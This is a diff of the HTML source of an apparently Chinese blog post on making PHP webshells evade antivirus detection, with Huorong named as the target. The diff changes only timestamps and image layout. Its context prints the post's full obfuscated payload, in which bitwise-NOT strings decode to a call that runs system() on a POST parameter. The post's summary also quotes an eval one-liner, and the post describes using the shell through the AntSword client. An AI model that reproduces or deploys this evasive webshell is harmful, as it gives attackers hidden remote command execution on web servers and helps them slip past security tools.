@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://pic1.imgdb.cn/item/6a0f4e362cb0eba86fb481bf.png">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/6a0f4ee32cb0eba86fb481c1.png">
 <meta property="article:published_time" content="2026-04-28T23:00:00.000Z">
-<meta property="article:modified_time" content="2026-05-21T18:28:56.774Z">
+<meta property="article:modified_time" content="2026-05-21T18:43:48.399Z">
 <meta property="article:author" content="ALL">
 <meta property="article:tag" content="PHP WebShell 免杀">
 <meta name="twitter:card" content="summary">
@@ -273,7 +273,8 @@
 <p>完整 Payload 如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span> = ~(</span><br><span class="line">    <span class="string">&quot;\x9E\x8D\x8D&quot;</span> .</span><br><span class="line">    <span class="string">&quot;\x9E\x86\xA0&quot;</span> .</span><br><span class="line">    <span class="string">&quot;\x92\x9E\x8F&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$__</span> = ~(</span><br><span class="line">    <span class="string">&quot;\x8C\x86\x8C&quot;</span> .</span><br><span class="line">    <span class="string">&quot;\x8B\x9A\x92&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$___</span> = ~(</span><br><span class="line">    <span class="string">&quot;\xA0&quot;</span> .</span><br><span class="line">    <span class="string">&quot;\xAF\xB0&quot;</span> .</span><br><span class="line">    <span class="string">&quot;\xAC\xAB&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$____</span> = ~(</span><br><span class="line">    <span class="string">&quot;\x9C&quot;</span> .</span><br><span class="line">    <span class="string">&quot;\x92\x9B&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$__</span>, [$&#123;<span class="variable">$___</span>&#125;[<span class="variable">$____</span>]]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><img src="https://pic1.imgdb.cn/item/69f13c3386dda55bd7338b8d.png"><br><img src="https://pic1.imgdb.cn/item/69f1430386dda55bd7338bbd.png"></p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><img src="https://pic1.imgdb.cn/item/69f13c3386dda55bd7338b8d.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/69f1430386dda55bd7338bbd.png"></p>
 <p>使用蚁剑 RSA 加密效果如下：</p>
 <p><img src="https://pic1.imgdb.cn/item/6a0f4e362cb0eba86fb481bf.png"></p>
 <p>这是编码器源码：</p>
@@ -492,7 +493,7 @@
           description: "",
           stripContent: "PHP WebShell 免杀之字符串运算 + 动态调用前言以火绒为例，如果直接传入一句话木马包被识别的 例如下面我刚写完保存就给我删了  我们要从杀软的角度去思考，毕竟杀软也是圈内安全人士开发的 识别木马最简单的方法就是读取文件内容识别关键字如 eval、assert 等等 当然也还有结构特征，例如 @eval($_GET[&amp;quot;code&amp;quot;]) 等等 以上是静态的，当然还有动态的，只不过这个根据杀软的强度来的，只要静态过了，动态大概率会过 WebShell 的动态不像 C2 木",
           date: "Wed Apr 29 2026 07:00:00 GMT+0800",
-          updated: "Fri May 22 2026 02:28:56 GMT+0800",
+          updated: "Fri May 22 2026 02:43:48 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
